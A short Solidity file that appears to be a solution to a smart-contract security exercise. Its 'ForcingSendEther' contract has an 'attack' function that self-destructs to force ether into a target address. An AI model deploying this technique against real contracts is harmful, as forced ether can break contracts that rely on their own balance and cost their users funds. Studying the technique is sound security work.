// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract DormantAccount {

}

contract ForcingSendEther {

    fallback() external payable {

    }

    function attack(address _problemAddress) public payable{
        address payable addr = payable(_problemAddress);
        selfdestruct(addr);
    }
}
